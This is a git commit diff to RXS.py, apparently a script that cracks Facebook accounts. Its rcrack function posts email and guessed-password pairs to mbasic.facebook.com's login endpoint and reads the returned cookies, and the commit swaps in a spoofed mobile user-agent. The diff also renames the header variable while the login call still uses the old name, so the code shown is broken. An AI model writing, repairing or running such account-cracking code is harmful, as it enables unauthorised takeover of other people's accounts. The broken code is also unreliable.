0d8ada358264fbeaddc24a0eb9a13557252baa9a
RJ SHANTO <124341668+hridoyshanto@users.noreply.github.com>
2023-04-24 09:37:30 +0600

    Add files via upload

--- RXS.py
+++ RXS.py
@@ -205,35 +205,19 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-     
-    "method": 'GET',
-    
-    "scheme": 'https',
-    
+            headers = {'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    
     'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
-    
     'cache-control': 'max-age=0',
-    
     'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    
     'sec-ch-ua-mobile': '?1',
-    
     'sec-ch-ua-platform': '"Android"',
-    
     'sec-fetch-dest': 'document',
-    
     'sec-fetch-mode': 'navigate',
-    
     'sec-fetch-site': 'none',
-    
     'sec-fetch-user': '?1',
-    
     'upgrade-insecure-requests': '1',
-    
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)',
 }
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
